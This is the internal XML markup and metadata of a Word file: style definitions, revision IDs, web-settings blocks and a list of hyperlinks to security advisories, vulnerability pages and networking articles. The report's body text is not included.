    <w:rsid w:val="00BD1E48"/>
    <w:rsid w:val="00BD1E60"/>
    <w:rsid w:val="00BD2BA4"/>
    <w:rsid w:val="00BD6DD2"/>
    <w:rsid w:val="00BD6E46"/>
    <w:rsid w:val="00BE3DE0"/>
    <w:rsid w:val="00BE6B72"/>
    <w:rsid w:val="00BF103C"/>
    <w:rsid w:val="00BF1B6E"/>
    <w:rsid w:val="00C1109F"/>
    <w:rsid w:val="00C34786"/>
    <w:rsid w:val="00C37525"/>
    <w:rsid w:val="00C40453"/>
    <w:rsid w:val="00C50722"/>
    <w:rsid w:val="00C5090A"/>
    <w:rsid w:val="00C544CA"/>
    <w:rsid w:val="00C545A5"/>
    <w:rsid w:val="00C57763"/>
    <w:rsid w:val="00C60150"/>
    <w:rsid w:val="00C611A5"/>
    <w:rsid w:val="00C635B3"/>
    <w:rsid w:val="00C6430B"/>
    <w:rsid w:val="00C66372"/>
    <w:rsid w:val="00C67A89"/>
    <w:rsid w:val="00C67FC2"/>
    <w:rsid w:val="00C74928"/>
    <w:rsid w:val="00C96DFF"/>
    <w:rsid w:val="00CA2F7F"/>
    <w:rsid w:val="00CA5897"/>
    <w:rsid w:val="00CA60EA"/>
    <w:rsid w:val="00CA73E4"/>
    <w:rsid w:val="00CB0BA3"/>
    <w:rsid w:val="00CC269F"/>
    <w:rsid w:val="00CC29DB"/>
    <w:rsid w:val="00CC6B6C"/>
    <w:rsid w:val="00CC77D7"/>
    <w:rsid w:val="00CD58A0"/>
    <w:rsid w:val="00CD72C8"/>
    <w:rsid w:val="00CE09C5"/>
    <w:rsid w:val="00CE13B3"/>
    <w:rsid w:val="00CE3778"/>
    <w:rsid w:val="00CF01E4"/>
    <w:rsid w:val="00CF208F"/>
    <w:rsid w:val="00D02382"/>
    <w:rsid w:val="00D0387A"/>
    <w:rsid w:val="00D23CA3"/>
    <w:rsid w:val="00D353EA"/>
    <w:rsid w:val="00D37451"/>
    <w:rsid w:val="00D40F41"/>
    <w:rsid w:val="00D43F2C"/>
    <w:rsid w:val="00D45195"/>
    <w:rsid w:val="00D46EE3"/>
    <w:rsid w:val="00D51047"/>
    <w:rsid w:val="00D524A2"/>
    <w:rsid w:val="00D56377"/>
    <w:rsid w:val="00D60EA5"/>
    <w:rsid w:val="00D6735F"/>
    <w:rsid w:val="00D72B82"/>
    <w:rsid w:val="00D76FA8"/>
    <w:rsid w:val="00D821C2"/>
    <w:rsid w:val="00D8233E"/>
    <w:rsid w:val="00D828F5"/>
    <w:rsid w:val="00D84EB8"/>
    <w:rsid w:val="00D9247C"/>
    <w:rsid w:val="00D92710"/>
    <w:rsid w:val="00D92A9D"/>
    <w:rsid w:val="00D95AE3"/>
    <w:rsid w:val="00D9718A"/>
    <w:rsid w:val="00DA1048"/>
    <w:rsid w:val="00DA4402"/>
    <w:rsid w:val="00DA5A1A"/>
    <w:rsid w:val="00DB274B"/>
    <w:rsid w:val="00DB3716"/>
    <w:rsid w:val="00DB4BBE"/>
    <w:rsid w:val="00DB5EFF"/>
    <w:rsid w:val="00DB6DA5"/>
    <w:rsid w:val="00DC07F2"/>
    <w:rsid w:val="00DC186F"/>
    <w:rsid w:val="00DC3193"/>
    <w:rsid w:val="00DC50DF"/>
    <w:rsid w:val="00DD22DB"/>
    <w:rsid w:val="00DD4356"/>
    <w:rsid w:val="00DD616C"/>
    <w:rsid w:val="00DE4B32"/>
    <w:rsid w:val="00DF555A"/>
    <w:rsid w:val="00DF63A1"/>
    <w:rsid w:val="00DF7320"/>
    <w:rsid w:val="00E07065"/>
    <w:rsid w:val="00E1180A"/>
    <w:rsid w:val="00E15853"/>
    <w:rsid w:val="00E16518"/>
    <w:rsid w:val="00E17874"/>
    <w:rsid w:val="00E2242D"/>
    <w:rsid w:val="00E25E2F"/>
    <w:rsid w:val="00E3075D"/>
    <w:rsid w:val="00E43745"/>
    <w:rsid w:val="00E50FE7"/>
    <w:rsid w:val="00E535BE"/>
    <w:rsid w:val="00E54A30"/>
    <w:rsid w:val="00E56045"/>
    <w:rsid w:val="00E62C0D"/>
    <w:rsid w:val="00E66886"/>
    <w:rsid w:val="00E726CD"/>
    <w:rsid w:val="00E73027"/>
    <w:rsid w:val="00E73629"/>
    <w:rsid w:val="00E747D3"/>
    <w:rsid w:val="00E85183"/>
    <w:rsid w:val="00E87F84"/>
    <w:rsid w:val="00E903B8"/>
    <w:rsid w:val="00E91521"/>
    <w:rsid w:val="00E916C6"/>
    <w:rsid w:val="00E935C0"/>
    <w:rsid w:val="00EA104E"/>
    <w:rsid w:val="00EA281C"/>
    <w:rsid w:val="00EA537D"/>
    <w:rsid w:val="00EA59AE"/>
    <w:rsid w:val="00EA6C42"/>
    <w:rsid w:val="00EA6C48"/>
    <w:rsid w:val="00EC27F5"/>
    <w:rsid w:val="00EC5779"/>
    <w:rsid w:val="00EC7EAE"/>
    <w:rsid w:val="00ED0F27"/>
    <w:rsid w:val="00ED1703"/>
    <w:rsid w:val="00ED2D67"/>
    <w:rsid w:val="00ED2E4C"/>
    <w:rsid w:val="00ED3057"/>
    <w:rsid w:val="00ED7D2D"/>
    <w:rsid w:val="00ED7F32"/>
    <w:rsid w:val="00EE048F"/>
    <w:rsid w:val="00EE77FD"/>
    <w:rsid w:val="00EF4289"/>
    <w:rsid w:val="00EF5198"/>
    <w:rsid w:val="00F00345"/>
    <w:rsid w:val="00F004B6"/>
    <w:rsid w:val="00F01BA5"/>
    <w:rsid w:val="00F03EBE"/>
    <w:rsid w:val="00F10BA5"/>
    <w:rsid w:val="00F12A52"/>
    <w:rsid w:val="00F12E2C"/>
    <w:rsid w:val="00F13864"/>
    <w:rsid w:val="00F13F90"/>
    <w:rsid w:val="00F15C6D"/>
    <w:rsid w:val="00F23E6A"/>
    <w:rsid w:val="00F2787D"/>
    <w:rsid w:val="00F31996"/>
    <w:rsid w:val="00F31EEF"/>
    <w:rsid w:val="00F46317"/>
    <w:rsid w:val="00F503D0"/>
    <w:rsid w:val="00F515BE"/>
    <w:rsid w:val="00F55CD2"/>
    <w:rsid w:val="00F61298"/>
    <w:rsid w:val="00F61A5E"/>
    <w:rsid w:val="00F63B8B"/>
    <w:rsid w:val="00F662A3"/>
    <w:rsid w:val="00F67941"/>
    <w:rsid w:val="00F67992"/>
    <w:rsid w:val="00F756B0"/>
    <w:rsid w:val="00F91219"/>
    <w:rsid w:val="00F91DC0"/>
    <w:rsid w:val="00FB126E"/>
    <w:rsid w:val="00FC23CF"/>
    <w:rsid w:val="00FE1D7F"/>
    <w:rsid w:val="00FE46FB"/>
    <w:rsid w:val="00FE6275"/>
    <w:rsid w:val="00FE761A"/>
    <w:rsid w:val="00FE7AC1"/>
    <w:rsid w:val="00FF2C32"/>
    <w:rsid w:val="00FF51EB"/>
    <w:rsid w:val="00FF5565"/>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5627"/>
  <w15:docId w15:val="{BE2FC200-9CD8-4C86-BF91-51B2D03F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rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading1">
    <w:name w:val="heading 1"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading1Char"/>
    <w:uiPriority w:val="9"/>
    <w:qFormat/>
    <w:rsid w:val="004D7B3D"/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:pageBreakBefore/>
      <w:numPr>
        <w:numId w:val="1"/>
      </w:numPr>
      <w:spacing w:before="360"/>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rsid w:val="009525A9"/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:numPr>
        <w:ilvl w:val="1"/>
        <w:numId w:val="1"/>
      </w:numPr>
      <w:pBdr>
        <w:bottom w:val="single" w:sz="12" w:space="1" w:color="auto"/>
      </w:pBdr>
      <w:spacing w:before="360" w:after="200"/>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semiHidden/>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character" w:styleId="UnresolvedMention">
    <w:name w:val="Unresolved Mention"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00910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30083">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40005133">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="153107962">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="266157082">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="295064080">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30616250">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="806434064">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="836580083">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="919681339">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72712159">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1003239304">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162813491">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1234656041">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1302925442">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01556203">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="146381552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78850343">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1799567243">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1829207403">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1907034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forbes.com/advisor/in/business/software/wordpress-alternatives" TargetMode="External"/><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vyos.io/"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cognisys.co.uk/blog/new-critical-ssh-vulnerability-released-cve-2024-6387/%20"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spiceworks.com/tech/networking/articles/what-is-network-topology/%20"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httpd.apache.org/security/vulnerabilities_22.html%20"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cisa.gov/secure-our-world/require-strong-passwords" TargetMode="External"/><Relationship Id="rId62" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://courses.aiu.edu/COMPUTERS/7/Lesson7.pdf%20"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pfsense.org/about-pfsense/"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cert.europa.eu/publications/security-advisories/2024-066/%20"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D385E7010A8C44CA4DCDE52D113C7FE" ma:contentTypeVersion="10" ma:contentTypeDescription="Create a new document." ma:contentTypeScope="" ma:versionID="a5d5d5dc9ce4bb9e02bdd366b8e284f1">
  <xsd:schema xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xs="http://www.w3.org/2001/XMLSchema" xmlns:p="http://schemas.microsoft.com/office/2006/metadata/properties" xmlns:ns3="98f365f6-870a-48ac-b84c-eb9bd15e8777" targetNamespace="http://schemas.microsoft.com/office/2006/metadata/properties" ma:root="true" ma:fieldsID="81330aed32d40cdafe2a26967628159f" ns3:_="">
    <xsd:import namespace="98f365f6-870a-48ac-b84c-eb9bd15e877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f365f6-870a-48ac-b84c-eb9bd15e87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8f365f6-870a-48ac-b84c-eb9bd15e8777" xsi:nil="true"/>
  </documentManagement>
</p:properties>
</file>

<file path=customXml/itemProps1.xml><?xml version="1.0" encoding="utf-8"?>
<ds:datastoreItem xmlns:ds="http://schemas.openxmlformats.org/officeDocument/2006/customXml" ds:itemID="{8FA073AE-F3A2-4169-B4FC-94F825E6F936}">
  <ds:schemaRefs>
    <ds:schemaRef ds:uri="http://schemas.microsoft.com/sharepoint/v3/contenttype/forms"/>
  </ds:schemaRefs>
</ds:datastoreItem>
</file>

<file path=customXml/itemProps2.xml><?xml version="1.0" encoding="utf-8"?>
<ds:datastoreItem xmlns:ds="http://schemas.openxmlformats.org/officeDocument/2006/customXml" ds:itemID="{3AA6DC86-6C59-4A80-973A-1374EE2B82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f365f6-870a-48ac-b84c-eb9bd15e87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03F1C2-E489-49DB-BF8D-A8043EA7EA94}">
  <ds:schemaRefs>
    <ds:schemaRef ds:uri="http://schemas.openxmlformats.org/officeDocument/2006/bibliography"/>
  </ds:schemaRefs>
</ds:datastoreItem>
</file>

<file path=customXml/itemProps4.xml><?xml version="1.0" encoding="utf-8"?>
<ds:datastoreItem xmlns:ds="http://schemas.openxmlformats.org/officeDocument/2006/customXml" ds:itemID="{946F8D05-0C9A-40F7-922C-C8E8474C7677}">
  <ds:schemaRefs>
    <ds:schemaRef ds:uri="http://schemas.microsoft.com/office/2006/documentManagement/types"/>
    <ds:schemaRef ds:uri="http://schemas.openxmlformats.org/package/2006/metadata/core-properties"/>
    <ds:schemaRef ds:uri="http://purl.org/dc/dcmitype/"/>
    <ds:schemaRef ds:uri="http://www.w3.org/XML/1998/namespace"/>
    <ds:schemaRef ds:uri="http://purl.org/dc/terms/"/>
    <ds:schemaRef ds:uri="http://schemas.microsoft.com/office/infopath/2007/PartnerControls"/>
    <ds:schemaRef ds:uri="98f365f6-870a-48ac-b84c-eb9bd15e8777"/>
    <ds:schemaRef ds:uri="http://schemas.microsoft.com/office/2006/metadata/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0</TotalTime>
  <Pages>60</Pages>
  <Words>12549</Words>
  <Characters>71531</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83913</CharactersWithSpaces>
  <SharedDoc>false</SharedDoc>
  <HLinks>
    <vt:vector size="258" baseType="variant">
      <vt:variant>
        <vt:i4>6291519</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>231</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>https://courses.aiu.edu/COMPUTERS/7/Lesson7.pdf</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>6291498</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>228</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>https://cognisys.co.uk/blog/new-critical-ssh-vulnerability-released-cve-2024-6387/</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>5242884</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>225</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>https://cert.europa.eu/publications/security-advisories/2024-066/</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>6422607</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>222</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>https://httpd.apache.org/security/vulnerabilities_22.html</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>6094872</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>219</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>https://vyos.io/</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>3014706</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>216</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>https://www.pfsense.org/about-pfsense/</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>4849754</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>213</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>https://www.spiceworks.com/tech/networking/articles/what-is-network-topology/</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>7077929</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>210</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>https://www.forbes.com/advisor/in/business/software/wordpress-alternatives</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2883683</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>207</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>https://www.cisa.gov/secure-our-world/require-strong-passwords</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>1376319</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>200</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc183984575</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1376319</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>194</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc183984574</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1376319</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>188</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc183984573</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1376319</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>182</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc183984572</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1376319</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>176</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc183984571</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1376319</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>170</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc183984570</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1310783</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>164</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc183984569</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1310783</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>158</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc183984568</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1310783</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>152</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc183984567</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1310783</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>146</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc183984566</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1310783</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>140</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc183984565</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1310783</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>134</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc183984564</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1310783</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>128</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc183984563</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1310783</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>122</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc183984562</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1310783</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>116</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc183984561</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1310783</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>110</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc183984560</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1507391</vt:i4>
